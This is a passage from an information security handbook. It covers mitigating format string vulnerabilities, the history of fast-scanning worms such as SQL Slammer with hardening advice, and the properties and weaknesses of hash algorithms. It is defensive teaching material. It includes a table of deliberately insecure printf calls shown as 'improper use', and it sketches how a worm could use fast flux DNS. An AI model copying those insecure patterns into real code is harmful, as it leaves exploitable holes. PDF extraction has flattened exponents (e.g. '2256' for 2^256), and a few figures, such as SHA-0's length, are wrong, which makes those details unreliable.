Format string vulnerabilities exist due to the fact that an untrusted user is given 
the ability to change the format strings of the output statements in the printf family 
of functions. This can be controlled and addressed by secure-coding mechanisms, 
such as ensuring that all arguments are specified when format routines are called, 
and by ensuring that all user data supplied is validated. However, as previously 
mentioned, the inherent reason that format string attacks are possible in the first 
place, for which there is no real mitigation measure, is due to the accommodative 

204  ◾  Information Security Management Handbook
(or one could say lax) nature in which output functions (printf family of func-
tions) in the C programming languages handle functions with variable arguments, 
combined with stack overflows in C/C++ on Intel x86 processors. Still, this is not a 
problem with the implementation of the C language, but instead is the ANSI C89 
standard way of dealing with functions with a variable number of arguments.
Because the problem seems to be intrinsic to the ANSI C89 standard, it may 
seem like there is really no good control or risk control measure for format string 
vulnerabilities. There are, however, certain management and technical control 
measures that can be taken to address format string vulnerabilities.
16.5  Management Controls
The first and foremost thing to do is to find out if your production systems have 
applications written in C/C++, the programming languages in which format string 
vulnerabilities are possible. Most legacy applications may fall into this category. If 
your applications are written in C/C++, management should consider requesting 
a source code audit of deployed code in production, with minimal disruptions to 
business operations. When the audit is performed, it is recommended that other 
application vulnerabilities besides format string vulnerabilities are checked for and 
addressed as well.
Additionally, developing a policy or standard to mitigate application security 
risks with specific procedural instructions for handling format string vulnerabilities 
should be considered.
16.6  Technical Controls
Technically, the programmer must ensure that any time the printf family of func-
tions are called, a format token is always specified and a corresponding value (vari-
able) of argument for the format token exists. The code shown in Figure 16.3 shows 
a printf function with format tokens and corresponding arguments, both specified. 
Table 16.3 demonstrates the improper and proper usage of some of the most com-
mon printf family of functions.
Figure 16.3  Format tokens with matching arguments specified.

Format String Vulnerabilities  ◾  205
Source code checks for format string vulnerabilities are relatively easy. One 
can use a GREP (global regular expression parser) to look at functions and make 
sure that the number of variable arguments (va_args) corresponds with the format 
tokens specified. This is possible when source code is available. In cases where the 
source code is not available, the format string vulnerabilities can be checked by 
using fuzzing, a form of software testing in which the tester provides random data 
(called fuzz) as inputs to the program and defects are detected and identified, based 
on how the program responds to the inputs.
Use of static code analyzers can assist in the automation of these checks. SPlint, 
Flawfinder, and FormatGuard are some freely available static code checkers, and 
commercial static code checkers may be worth your investment if your organization 
deals extensively with C/C++ technologies.
Another effective countermeasure against format string attacks is dynamically 
maintaining a whitelist (allowable) of address ranges that allows printing func-
tions to write-to and is checked prior to writing (using the %n format token) in to 
those address ranges. Any valid address locations that are written-to are dynami-
cally added to the whitelist for improved performance in subsequent calls. Finally, 
upon completion of the printing functions, the programmer should safely free up 
or “unregister” the memory address location.
There are other mitigation measures, such as hardened libraries, runtime detection 
of illegal memory writes, type-safe implementation of C, code rewriting, and fault iso-
lation, that have been proven effective with certain limitations. Some of these limita-
tions are missing wrappers that call the printf family of functions or restricting format 
tokens, especially the %n format token that can be used for overwriting memory.
16.7  Format String Vulnerability and Buffer Overflow
Both format string vulnerabilities and buffer overflows may lead to information 
leakage, execution of arbitrary code by overwriting function pointers in memory, 
Table 16.3  Improper and Proper Use of printf Family of Functions
Function
Improper Use
Proper Use
printf
printf (“Some String”);
printf (“%s,” “Some String”);
fprintf
fprintf (pFile, name);
fprintf (pFile, “Name : %s\n,” name);
sprintf
sprintf (buffer, a+b);
sprintf (buffer, “The sum is %d,” a+b);
vfprintf
vfprintf (stream, args);
vfprintf (stream, format, args);
vprintf
vprintf (args);
vprintf (format, args);
vsprintf
vsprintf (buffer, args);
vsprintf (buffer, format, args);

206  ◾  Information Security Management Handbook
or crashing programs, and so have been mistakenly classified in the past under the 
same category. However, there is a fundamental difference between format string 
vulnerabilities and buffer overflows, and this has to do with the location where 
memory is overwritten and its control by the attacker.
Buffer overflows are primarily data boundary errors in which unsafe C string 
copy functions such as strcpy() are used to copy data larger than the size of the buffer, 
causing it to overflow, with no control by the attacker as to where memory is over-
written. Input validation is a good countermeasure against buffer overflow attacks.
Format string vulnerabilities, as we have seen, are due to the fact that externally 
supplied user data is interpreted as part of the format string arguments and a format 
string attacker can choose where memory is overwritten.
16.8  Conclusion
In summary, format string vulnerabilities happen when data inputted by a user is 
outputted in the format as specified by the format string (format token) of the printf 
family of functions. When an attacker supplies format tokens without a corre-
sponding variable in the argument list on the stack, data values, including memory 
addresses, are used in the variable’s place. This could have a serious impact on con-
fidentiality by information disclosure, on integrity by overwriting data on stack or 
memory locations, and on availability by crashing programs and services, besides 
affording the possibility to run arbitrary code by an attacker. Although format 
string vulnerabilities are growing rarer with the evolution of programming lan-
guages, it is imperative to address and mitigate format string vulnerabilities without 
fail. It is important that a defense-in-depth strategy should be implemented, with 
layered countermeasures implemented and used in conjunction with one another as 
a measure of maximum security against format string attacks.

207
17
Chapter 
Fast Scanning Worms
Paul A. Henry
17.1  Introduction
Although worms have evolved from both technological and social engineering per-
spectives, there has been little change in the basic method of propagation—the 
initial scanning phase in which the worm looks for the vulnerable hosts. Once a 
worm reaches an installation base of 10,000 or more hosts, propagation becomes 
exponentially faster. In virtually all cases to date, worms have been slow to find the 
initial 10,000 or so exploitable hosts. During this scanning phase, worms produce 
quite a bit of “noise” as they scan random address ranges across the Internet, looking 
for targets. This causes firewalls and IDS systems to generate alerts and serves as an 
early warning that a new worm is winding its malicious way across the Internet.
Current technology worms take advantage of new fast scanning routines that 
will dramatically accelerate the initial propagation phase, and some even use pre­
scanning data virtually to eliminate that first slow phase of scanning for vulnerable 
hosts. This new strain is referred to as a “fast scanning” worm, sometimes called a 
Warhol worm. An excellent paper that discusses the Warhol worm concept, written 
Contents
17.1	 Introduction..............................................................................................207
17.2	 No Longer Any Advance Warning........................................................... 208
17.3	 Detailed Historical Perspective of the First Warhol Worm: SQL 
Slammer................................................................................................... 208
17.4	 Fast Scanning Worm Defensive Considerations........................................210
17.5	 Addendum 1.............................................................................................212

208  ◾  Information Security Management Handbook
by Nicholas C. Weaver at the University of California, Berkeley in 2001* is recom-
mended reading for all network administrators.
17.2  No Longer Any Advance Warning
Even with 14 hours of advance warning, networks and systems were completely 
overwhelmed with the speed of Code Red. We entered a new era in worms, what 
is thought to be the first fast scanning/Warhol worm/SQL Slammer doubling in 
size every 8.5 seconds. There was simply no chance to defend against it as it circled 
the globe (Figure 17.1), reaching full Internet saturation in about an hour (Figure 
17.2).† What will the devastation be when a worm completely eliminates the initial 
scanning phase of hunting for 10,000 vulnerable hosts? Estimates average that it 
would take about six minutes for this new type of worm to saturate the Internet 
completely. It is no longer a matter of how this can be accomplished; it is simply a 
matter of when. We now have the technology to facilitate this new worm. All that 
is lacking is the attacker with the will and malicious intent.
17.3  Detailed Historical Perspective of the 
First Warhol Worm: SQL Slammer
The SQL Slammer worm struck January 25, 2003, and entire sections of the 
Internet began to go down almost immediately:
Within minutes, Level 3’s transcontinental chain of routers began to fail, 
◾
◾
overwhelmed with traffic.
300,000 cable modems in Portugal went dark.
◾
◾
South Korea fell right off the map, and 27 million people were without cell 
◾
◾
phone or Internet service.
Unconfirmed reports said that five of the Internet’s 13 root-name servers—all 
◾
◾
hardened systems—succumbed to the storm of packets.
Corporate e-mail systems jammed.
◾
◾
Websites stopped responding.
◾
◾
Emergency 911 dispatchers in suburban Seattle resorted to paper.
◾
◾
Unable to process tickets, Continental Airlines canceled flights from its 
◾
◾
Newark hub. Most of the company’s 75,000 servers were affected within the 
first ten minutes.‡
*	See “A Warhol worm: An Internet plague in 15 minutes!” http://www.cs.berkeley.edu/~nweaver/
warhol.old.html.
†	See http://www.caida.org/research/security/sapphire/sapphire-2f-30m-2003-01-25.gif for an 
animation of the spread of SQL Slammer.
‡	 www.csoonline.com/whitepapers/ 050504_cyberguard/EvolutionoftheKillerWorms.pdf.

Fast Scanning Worms  ◾  209
SQL Slammer took advantage of a known vulnerability in Microsoft SQL Server 
software, a limit to the actual number of servers compromised. Using the now-
familiar random address scanning technique to search for vulnerable hosts, SQL 
Slammer included elements that enabled it to propagate rapidly. By using the inher-
ently faster UDP communications protocol in lieu of TCP as a communications 
protocol, SQL Slammer eliminated the overhead of a connection-oriented protocol. 
At only 367 bytes, SQL Slammer was one of the smallest worms on record, infect-
ing more than 90 percent of vulnerable hosts within only ten minutes
A variation of SQL Slammer was reported to have been responsible for a disrup-
tion at a nuclear power plant in Ohio on June 20, 2003.* Some reports suggest that 
*	www.inel.gov/nationalsecurity/features/powerplay.pdf

Figure 17.1
Figure 17.2

210  ◾  Information Security Management Handbook
a variant of SQL Slammer may have played a role in the August 14, 2003, power 
failure that blacked-out cities from Ohio to New York. Damage estimates for SQL 
Slammer were $1.2 billion.*
17.4  Fast Scanning Worm Defensive Considerations
One risk mitigation methodology for fast scanning worms proposed in 2005 by 
Jayanthkumar Kannan at the University of California, Berkeley was based in part 
on tracking those connections that went outside of the enterprise network directly 
to IP addresses without the utilization of DNS. It was thought that an increase in 
direct IP address connections that was statistically abnormal for a given network 
could perhaps be an early indication of a fast scanning worm. Combining this 
early warning with cooperation between enterprise networks, it was believed that 
a reasonable level of containment could be achieved. This solution would today 
be ineffective as cyber criminals have developed “fast flux DNS” that will allow 
external connections without generating any abnormal connection, i.e., without 
any DNS alerts.
Fast flux DNS has become a standard component of current malware, and 
although it has not been incorporated into any noteworthy fast scanning worms to 
date, it certainly has the potential to wreak havoc if used with a fast scanning worm 
on the public Internet. Effectively, fast flux DNS can eliminate the scanning respon-
sibility for a compromised host that traditionally had to run code locally to generate 
an IP addresses to attack. Effectively, the malicious code could simply point to a mali-
cious fast flux DNS server with one of many possible URLs and allow the fast flux 
DNS server to provide the IP address of the next potential victim. With multiple fast 
flux DNS servers under the direct control of cyber criminals, a fast scanning worm 
using fast flux DNS would be faster than Slammer and could potentially spread com-
pletely undetected until well after it reached full Internet propagation.
New defensive technologies, such as reputation defenses that use dynamic statis-
tical data on the behavior of a given network as it interacts across the public Internet, 
offer potential risk mitigation. However, the effectiveness would be limited to the 
breadth and depth of knowledge within a given vendor’s reputation database. The 
risk mitigation available when using reputation defenses could be increased for the 
Internet community at large, if in fact they were to be deployed at the carrier level, 
thereby having the ability to “see” a larger portion of total Internet traffic.
When considering defenses for fast scanning worms, there is no Holy Grail or 
Magic Black Box that one can simply plug in to a network to mitigate the associated 
risks fully. Following common best practices can afford significant risk mitigation 
and is your best available defense. Following is a list of the top 15 things you can do 
to harden your enterprise against fast scanning worm attacks:
*	www.somix.com/files/SMS-SQL-Slammer-Article.pdf

Fast Scanning Worms  ◾  211
	
1.	Patch all of your systems (both servers and desktops) and remove or disable 
all unnecessary services.
	
2.	Review your security policy and re-evaluate the business need for services 
you allow access to on the Internet. Eliminate all but those services that are 
essential to operating your business.
	
3.	Use a URL filter for all internal user browser connections to the public that 
goes beyond the typical classification filtering and incorporates dynamic rep-
utation data to block connections to Websites hosting malware. Remember 
good Web can go bad quickly on today’s Internet.
	
4.	Use application proxies with complete packet inspection on all traffic inbound 
to your publicly accessible servers.
	
5.	Isolate all publicly accessible servers, each on their own physical network seg-
ment. Servers should be grouped by trust, not by convenience.
	
6.	Create granular access controls that prevent your publicly accessible serv-
ers from originating connections either to the public Internet or to your 
intranet.
	
7.	Create access controls to limit internal users’ outbound access to only 
those services that are necessary to complete the business objectives of the 
organization.
	
8.	Use reputation-based defenses as a component of your anti-spam filter to drop 
e-mails that originated from networks that fall below your risk threshold.
	
9.	Strip all potentially malicious e-mail attachments within your SMTP appli-
cation proxy firewall; see Addendum 1.
	 10.	Use an anti-virus server complimented with anti-malware scanning technol-
ogy on an isolated network segment to eradicate viruses and worms from per-
mitted e-mail attachments and returned Web traffic to users browsers before 
allowing either through your firewall.
	 11.	Deploy anti-virus software on all desktops throughout your business.
	 12.	Use reputation-based defenses at the firewall to block connections from net-
works with reputations that fall below your acceptable risk threshold.
	 13.	Use ingress anti-spoofing filters on your border router to prevent spoofed pack-
ets that are common to worm propagation from entering your network.*
	 14.	Use egress anti-spoofing on your border router to prevent a worm or poten-
tially malicious internal user from launching spoofed IP address-related 
attacks across the Internet from inside your network.†
	 15.	Create an incident response plan that includes an out-of-band communica-
tions method to your bandwidth provider so you can head off attacks and 
shun IP addresses on the provider’s border routers, minimizing any impact 
within your pipe.
*	Refer to http://www.zvon.org/tmRFC/RFC2827/Output/chapter3.html for a good explana-
tion of ingress filtering.
†	 Refer to http://www.sans.org/y2k/egress.htmUT for a good explanation of egress filtering.

212  ◾  Information Security Management Handbook
17.5  Addendum 1
File extensions that should be considered (in alphabetical order):
ad:  Microsoft Access Project Extension
ade:  Microsoft Access Project Extension
adp:  Microsoft Access Project
asp:  Active Server Page
bas:  Microsoft Visual Basic Class Module
bat:  Batch File
chm:  Compiled HTML Help File
cmd:  Microsoft Windows NT Command Script
com:  Microsoft MS-DOS Program
cpl:  Control Panel Extension
crt:  Security Certificate
exe:  Program
hlp:  Help File
hta:  HTML Program
inf:  Setup Information
ins:  Internet Naming Service
isp:  Internet Communication Settings
js:  JScript File
jse:  JScript Encoded Script File
lnk:  Shortcut
mdb:  Microsoft Access Program
mde:  Microsoft Access MDE Database
msc:  Microsoft Common Console Document
msi:  Microsoft Windows Installer Package
msp:  Microsoft Windows Installer Patch
mst:  Microsoft Visual Test Source Files
pcd:  Photo CD image, Microsoft Visual Compiled Script
pif:  Shortcut to MS-DOS Program
reg:  Registration Entries
scr:  Screen Saver
sct:  Windows Script Component
shb:  Shell Scrap Object
shs:  Shell Scrap Object
url:  Internet Shortcut
vb:  VBScript File
vbe:  VBScript Encoded Script File
vbs:  VBScript File
vsd:  Microsoft Visio File Type
vss:  Microsoft Visio File Type

Fast Scanning Worms  ◾  213
vst:  Microsoft Visio File Type
vsw:  Microsoft Visio File Type
wsc:  Windows Script Component
wsf:  Windows Script File
wsh:  Windows Script Host Settings File


5
CRYPTOGRAPHY


217
18
Chapter 
Message Digests
Ralph Spencer Poore
18.1  What Is a Message Digest?
The basic idea of a message digest is that a set of bits produced by a cryptographic 
hash function serves as a compact representation of the original message (i.e., the 
input string to the hash function) and can be used to identify that message uniquely. 
Any change in the original message has a very high probability of resulting in a dif-
ferent message digest. This makes the message digest useful in detecting errors or 
unauthorized changes in a message. Additionally, because the hash function creates 
a mapping of a variable length string into a smaller, fixed-length string, information 
is lost. This makes it a one-way function. The message digest can therefore be used 
Contents
18.1	 What Is a Message Digest?........................................................................217
18.2	 For What Purposes Are They Used?..........................................................219
18.3	 How Do Cryptographic Hashing Algorithms Work?............................... 220
18.4	 What Are Their Strengths and Weaknesses?............................................. 222
18.5	 Specific Hash Algorithms......................................................................... 222
18.6	 Some Suggestions for Strengthening.........................................................224
18.7	 What Might the Future Hold?..................................................................224
Recommended Resources: Standards..................................................................225
Recommended Resources: Books.......................................................................225
Recommended Resources: Miscellaneous Publications...................................... 226
Recommended Resources: Organizations.......................................................... 226

218  ◾  Information Security Management Handbook
to prove the existence of a message without permitting its reconstruction. This has 
value in authentication applications.
A cryptographic hash function is one that is designed to achieve certain secu-
rity properties: collision resistance, preimage resistance, and second preimage resis-
tance. The security purpose for which the hash functions are used may not require 
the cryptographic hash function to meet all of these properties.
Collision resistance is defined by the National Institute of Standards and 
Technology (NIST) as the computational infeasibility of finding two different 
inputs to the hash function that have the same hash value. That is, if H is a hash 
function, it is computationally infeasible to find two different inputs x and y for 
which H(x) = H(y). Collision resistance is measured by the number of hashing 
operations needed to find a collision for a hash function (i.e., the amount of work 
or “work factor”). The amount of collision resistance provided by a hash function 
cannot exceed half the length of the hash value produced by a given hash function. 
For example, SHA-256 produces a (full-length) hash value of 256 bits; therefore, 
SHA-256 cannot provide more than 128 bits of collision resistance. This is why the 
effective security for a cryptographic hash function is never greater than half of the 
resulting bit-length of the message digest.
Preimage resistance (also called the one-wayness property) is defined as the com-
putational infeasibility of finding x so that, given a randomly chosen hash value y, 
the hash (H) of x would equal that value, i.e., H(x) = y. Preimage resistance is mea-
sured by the amount of work needed to find a preimage for a hash function. The 
amount of preimage resistance provided by a hash function cannot exceed the length 
of the hash value produced by a given hash function. For example, SHA-256 cannot 
provide more than 256 bits of preimage resistance; this means that a work factor of 
2256 operations will likely find a preimage of a (full-length) SHA-256 hash value.
Secondary preimage resistance is defined as the computational infeasibility of 
finding a second input that has the same hash value as any other specified input. 
That is, given an input x, it is computationally infeasible to find a second input y 
that is different from x, such that H(x) = H(y). Second preimage resistance is mea-
sured by the amount of work needed to find a second preimage for a given hash 
function. Just as in the case for preimage resistance, the amount of second preimage 
resistance provided by a hash function cannot exceed the length of the hash value 
produced by the given hash function. For example, producing an MD6 of 128-bits 
length cannot provide more than 128 bits of second preimage resistance.
An image (i.e., a hash value) always has a corresponding preimage; a preimage is 
the input to the hash function that produces the given hash value. An image might 
or might not have a second preimage that is a different input to the hash function 
that produces the same hash value. If a second preimage exists, then there is no way 
to determine which preimage (the real preimage or the second preimage) actually 
produced the given hash value; either of the preimages could be the authentic one. 
If a hash function is preimage resistant, then it is also second preimage resistant.

Message Digests  ◾  219
The security strength of a hash function for digital signatures is defined as its 
collision resistance strength. Not all applications of hash functions require collision 
resistance, but may require preimage or second preimage resistance. For example, a 
hash function that is not suitable for a digital signature application might be suit-
able for other cryptographic applications that do not require collision resistance. 
The security strengths of NIST-approved hash functions for different applications 
can be found in NIST Special Publication 800-57: Recommendation for Key 
Management—Part 1: General (Revised).
18.2  For What Purposes Are They Used?
A message digest may serve many purposes: message integrity, digital signature 
(authentication of sender or content creator), cryptographic keying material 
generation (i.e., as part of a deterministic random bit generator [DRBG]), and 
knowledge proof without disclosure of sensitive information (e.g., for password 
verification).
The message digest may provide for message integrity by allowing the detection 
of changes in a message. This may serve to catch errors similar to the use of a cyclic 
redundancy check or parity, but generally much more powerfully. The message 
digest may also serve to detect unauthorized modifications especially when used 
in conjunction with a digital signature. Because the integrity of a message is often 
more critical in business than confidentiality, this is an important service.
When used in a digital signature application, the message digest can tie the 
message to the sender or creator of the message. Although using a digital signature 
application across an entire message would also accomplish this, it is inefficient and, 
for long messages, impractical.
The cryptographic hashing process used for message digests can also be used as 
part of a DRBG or as part of a nondeterministic random bit generator (NRBG). 
Both a DRBG and an NRBG produce bit strings suitable for use as cryptographic 
keying material. The outputs are statistically random. Technical details of these 
random bit generators are available in ANSI/X9 X9.82-1-2006 Random Number 
Generation, Part 1: Overview and Basic Principles, and in NIST Special Publication 
800-90: Recommendation for Random Number Generation Using Deterministic 
Random Bit Generators (Revised).
A message digest may also prove knowledge of the original message without 
exposing the original message to compromise. Although this is not a guarantee that 
the original message cannot be determined, especially if done poorly (as many pass-
word hashing schemes have been), it can greatly increase the work factor. Increasing 
the work factor is especially important when the original message is short (e.g., a 
personal identification number or password) or where the original message is too 
long to be used in practice (e.g., a copyrighted work or trade secret document).

220  ◾  Information Security Management Handbook
18.3  How Do Cryptographic Hashing 
Algorithms Work?
Cryptographic hashing algorithms used to create message digests are one-way func-
tions that map an arbitrary-length input message M to a fixed-length output hash 
H(M) and that, ideally, meet the three security properties previously discussed. 
However, several different techniques or mathematical approaches exist that accom-
plish this.
One of the approaches frequently used is based on Merkle-Damgård, illustrated 
in Figure 18.1. This process ties every block with every other block by using the 
results of the preceding block as input to the function executed on the current 
block. The result is a fixed-length hash that may then be used to represent the entire 
message. Because information is lost at each step, it is a one-way function intended 
to prevent reconstruction of the original message.
Another technique is to incorporate a cryptographic key into the hash pro-
cess. To prevent someone from replacing a message with an alternate and its 
associated hash, a keyed hash is used. This requires that the attacker know not 
only the hash algorithm used (generally not a secret), but also a secret key known 
only by the sender and receiver. An example is the (withdrawn) ANSI X9.9 now 
reflected in ISO 8730 and ISO 8731, commonly known as the DES-MAC. The 
ISO standards differ slightly from the ANSI standard in that they do not limit 
themselves to DES to obtain the message authentication code, but allow the use 
of other message authentication codes and block ciphers. Another example is 
HMAC, one version of which is described in ANS X9.71 Keyed Hash Message 
Authentication Code. This defines an algorithm to compute a message authenti-
cation code (MAC) using a hash function such as SHA-1. The MAC is computed 
by the sender and verified by the receiver. Input to the process is the sender’s 
Message
Message
Block 1
Message
Block 2
Message
Block 3
Message
Block n
Message
Paddling
Initialization
Vertor (IV)
Function
Function
Function
Function
Function
Hash
Figure 18.1  Merkle-Damgård hash function.

Message Digests  ◾  221
data and a secret key shared by the sender and receiver. Output from the process 
is the MAC. The MAC is used by the receiver to detect accidental or deliberate 
alteration of data. This is almost identical to the NIST FIPS PUB 198-1 HMAC 
shown in Figure 18.2.
Determine Secret Key (K)
Exclusive Or K with ipad
Concatenate result with 
Text
Hash result of concatenation with text
Exclusive Or K with opad
Concatenate result with
hash
Hash result of concatenation
 
Figure 18.2  Keyed hash message authentication code (HMAC).

222  ◾  Information Security Management Handbook
18.4  What Are Their Strengths and Weaknesses?
Message digests, because they map from many bits to few bits, are generally one-
way functions that do not permit reconstruction of the original message, but can 
demonstrate knowledge about the original message. This makes their use a great 
efficiency in applications of digital signatures and message integrity. However, not 
all hash algorithms meet the security properties previously discussed, namely, col-
lision resistance, preimage resistance, and second preimage resistance. The original 
secure hash algorithm (SHA) [FIPS 180, published in 1993], now generally referred 
to as SHA-0, was found to have collisions with a higher frequency than the allowed 
value of one half of the length (180 bits/2 = 90 bits). MD4, discussed later, is 
another example of a message digest algorithm that has failed the test of time.
Data compression algorithms are an example of an entire class of algorithms 
that are not hash algorithms, but may be confused by some people as hash algo-
rithms because they produce smaller messages and potentially increased efficiency. 
Compression algorithms, however, must permit message reconstruction. Because 
that fails the principle of being a one-way function, they are inappropriate as hash 
functions. (The use of a compression algorithm as one of many steps within a larger 
hash function might serve a useful purpose—and in fact is used in some hash func-
tion implementations—but it must not be used alone.)
Message digests produced using a hash algorithm that does not include mes-
sage length form a special class of potentially weak message digests. This is because 
the resulting digest is of a fixed-block size, but the message may be of any size. A 
variable length message of potentially any size provides for a limitless number of 
synonyms of any given message digest. Although the computational feasibility may 
be low of finding a message M’ that results in the same hash value H as does a given 
message M (especially for cryptographic hash algorithms that produce large mes-
sage digests), the potential for a meaningful collision (i.e., a message with the same 
message digest [a synonym] that makes sense) is greatly increased. For example, if I 
send a message that authorized the purchase of 100 widgets, and it is received with 
a valid message digest, but the contents of the message make no sense, the recipient 
would contact the sender to sort it out. But if the message appeared to order 450 
instead of 100, the recipient could accept and process the altered transaction relying 
on the valid message digest. One way of preventing this is the use of a technique 
developed by Merkle-Damgård that incorporates the length of the message as one 
of the blocks input to the hash algorithm. Although a meaningful collision may 
still exist, neither shorter nor longer messages can be used to produce it.
18.5  Specific Hash Algorithms
Replacing SHA-0 in 1995, SHA-1 [FIPS 180-1] was intended to address SHA-
0’s security weaknesses. The improvement was based on work done by Professor 

Message Digests  ◾  223
Ronald L. Rivest of MIT when designing the MD4 message digest algorithm. 
However, by 2005, SHA-1 was in trouble. According to renown cryptographer 
Bruce Schneier, the research team of Xiaoyun Wang, Yiqun Lisa Yin, and Hongbo 
Yu (mostly from Shandong University in China) circulated a paper describing their 
results of collisions in the full SHA-1 in 269 hash operations—much less than the 
brute-force attack of 280 operations based on the hash length of 160 bits. Although 
this did not mean that commercial use of SHA-1 needed to end immediately, it did 
mean that migration to stronger algorithms was needed.
A family of stronger algorithms (primarily because of longer keyed hashes) con-
sists of the hash functions SHA-224, SHA-256, SHA-384, and SHA-512. These 
algorithms are described in NIST FIPS 180-2 (August 2002). NIST has established 
a 2010 deadline for government to complete migration away from SHA-1 to this 
family of secure hash algorithms. However, these algorithms may also be subject 
to the evolving cryptanalytic attacks discovered for SHA-1, although currently not 
computationally feasible.
The MD2 message digest algorithm is defined in RFC 1319 and is based on 
material prepared by John Linn and Ronald L. Rivest. The algorithm, also known as 
RSA-MD2, was published for use in 1989. MD2 takes as input a message of arbitrary 
length and produces as output a 128-bit “fingerprint” or “message digest” of the input. 
The message is first padded to ensure a length in bytes that is divisible by 16. A 16-byte 
checksum is then appended to the message. The hash value is computed on the result-
ing message. Although a cryptographic strength of 264 against collisions based on 
brute-force attacks may have lost out to Moore’s law, the algorithm has stood up well. 
Rogier and Chauvaud have found that collisions for MD2 can be constructed if the 
calculation of the checksum is omitted. This is the only cryptanalytic result known for 
MD2. This algorithm has been one of the most widely used for Internet traffic.
MD4 and MD5 algorithms are similar in design, but unlike MD2, which is 
optimized for eight-bit processing, these are optimized for 32-bit processing.
Ronald Rivest developed MD4 in 1990. He published it for use in RFC 1320. 
The message is padded to ensure that its length in bits plus 64 is divisible by 512. 
A 64-bit binary representation of the original length of the message is then concat-
enated to the message. The message is processed in 512-bit blocks in the Merkle-
Damgård iterative structure discussed earlier. Each block is processed in three 
distinct rounds. Attacks on versions of MD4 with either the first or the last rounds 
missing were developed very quickly by den Boer, Bosselaers, and others. Hans 
Dobbertin showed how collisions for the full version of MD4 could be found in 
under a minute on a typical PC. In 1998, Dobbertin showed that a reduced version 
of MD4, in which the third round of the compression function is not executed but 
everything else remains the same, is not a one-way function. RSA considers MD4 
broken and recommends against its use.
In 1991, Ronald Rivest developed MD5, which he published as RFC 1321 in 
1992. Although it is similar to MD4, it is more robust and uses four distinct rounds 
instead of three, giving it a slightly different design from that of MD4. Otherwise, 

224  ◾  Information Security Management Handbook
message digest size, as well as padding requirements, remains the same. The price 
of the improved security is a modest performance impact.
Den Boer and Bosselaers have found pseudo-collisions for MD5 and work by 
Dobbertin has extended the techniques used so effectively in the analysis of MD4 
to find collisions for the compression function of MD5. Although stopping short of 
providing collisions for the hash function in its entirety, this is clearly a significant 
step. Both Rivest and Dobbertin have indicated that MD5 should not be used in 
new applications where collision avoidance is important.
Van Oorschot and Wiener have considered a brute-force search for collisions 
in hash functions. They estimated a collision search machine designed specifically 
for MD5 (costing $10 million in 1994) could find a collision for MD5 in 24 days 
on average. Extrapolating to 2008, the machine would take about a week. These 
general techniques can be applied to other hash functions.
As previously introduced, mechanisms that provide integrity checks based on 
a secret key are usually called message authentication codes (MACs). Typically, a 
MAC is used between two parties that share a secret key to authenticate informa-
tion transmitted between these parties. The keyed hash message authentication 
code (HMAC) is a mechanism for message authentication using cryptographic 
hash functions. The NIST FIPS PUB 198-1 (June 2007) describes HMAC, which 
can be used with any iterative “approved” cryptographic hash function, in combi-
nation with a shared secret key. Because it relies on existing hash functions, it may 
be subject to attacks associated with the selected hash function. However, because 
it also relies on a secret key, HMAC may prove much harder to break. Clearly, the 
secrecy of the key is of paramount importance.
18.6  Some Suggestions for Strengthening
Using the best available hash algorithm based on published standards is always a 
good start. Concatenating the results of two independent hash functions to create 
a single hash value (a process referred to as cascading) should substantially increase 
the work factor for an adversary. To calculate a collision for such a message digest 
would require the independent solving for collisions of each independent hash 
function and then finding a common collision—highly unlikely.
The use of keyed hashes, if based on strong cryptographic algorithms and 
robust key sizes, can greatly improve the protection provided by the message digest. 
Because this adds the burden of cryptographic key management, it is not always a 
viable choice.
18.7  What Might the Future Hold?
Two important developments are in progress. First, NIST has opened a competi-
tion for a new “SHA-3” that will be similar to the competition that resulted in the 

Message Digests  ◾  225
Advanced Encryption Standard. Second, the use of quantum states to ensure the 
detection of altered messages will provide an alternative to the use of secure hash 
functions in some applications.
The NIST competition reflects concern over advances in cryptanalysis of hash 
functions and in computational capability. Details of the competition are avail-
able at http://www.nist.gov/hash-competition. The competition was announced in 
a Federal Register Notice on November 2, 2007. Entries for the competition had to 
be submitted by October 31, 2008.
The use of quantum mechanical properties to detect changes in a transmitted 
message is moving from experimental to early adoption in high-security applications. 
Ben Rothke provided an overview of quantum cryptography in volume 3 of the fifth 
edition of the Information Security Management Handbook. The physics and several 
implementations are described. Although this remains an interesting area of research, 
it will never replace the use of message digests, especially in the realm of data at rest.
New hash functions and approaches to producing message digests and MACs 
appear in cryptographic literature regularly. Those interested in this area should 
join one or more organizations that publish material in this domain. The author has 
provided a list of recommended resources for additional study.
Recommended Resources: Standards
ANSI/X9 X9.30-2-1997 06-Jan-1997 Public Key Cryptography Using Irreversible 
Algorithms—Part 2: The Secure Hash Algorithm (SHA-1).
ANSI/X9 X9.82-1-2006 26-Jul-2006 Random Number Generation, Part 1: Overview and 
Basic Principles.
INCITS/ISO/IEC 10118-1:2000[R2005] Information Technology—Security Techniques—
Hash Functions—Part 1: General (Second Edition).
INCITS/ISO/IEC 9797-1:1999[R2005] Information Technology—Security Techniques—
Message Authentication Codes (MACs)—Part 1: Mechanisms Using Block Cipher 
(Third Edition).
INCITS/ISO/IEC 9797-2:2002[R2007] Information Technology—Security Techniques—
Message Authentication Codes (MACs)—Part 2: Mechanisms Using a Hash Function 
(Third Edition).
Federal Information Processing Standard 180-2, Secure Hash Standard. August 1, 2002; 
available at csrc.nist.gov/publications/fips/fips180-2/fips180-2withchangenotice.pdf.
Recommended Resources: Books
Burnett, S. and Paine, S. (2001) RSA Security’s Official Guide to Cryptography. New York: 
McGraw-Hill.
Koblitz, N. (1994) A Course in Number Theory and Cryptography, Second Edition. New 
York: Springer-Verlag.

226  ◾  Information Security Management Handbook
Menezes, A.J., Van Oorschot, P.C. and Vanstone, S.A. (1997) Handbook of Applied 
Cryptography, ch. 9. Boca Raton: CRC Press.
Recommended Resources: Miscellaneous Publications
Den Boer, B. and Bosselaers, A. (1992) An attack on the last two rounds of MD4. Advances 
in Cryptology—Crypto ‘91, Springer-Verlag, pp. 194–203.
Dobbertin, H. (1996) The status of MD5 after a recent attack. CryptoBytes, 2(2), 1–6. 
Available at ftp://ftp.rsasecurity.com/pub/cryptobytes/crypto2n2.pdf.
Dobbertin, H. and Ann, A.S. (1995) CryptoBytes, 1(3), 4–5. Available at ftp://ftp.rsasecurity.
com/pub/cryptobytes/crypto1n3.pdf.
Rivest, Ronald L. (1991) The MD4 message digest algorithm. Advances in Cryptology—
CRYPTO ‘90 Proceedings, Springer-Verlag, pp. 303–311.
Robshaw, M.J.B. (1996) On recent results for MD2, MD4, and MD5. RSA Laboratories 
Bulletin 4.
Rogier, N. and Chauvaud, P. (1997) MD2 not secure without the checksum byte. Designs, 
Codes and Cryptography, 12(3), 245–251.
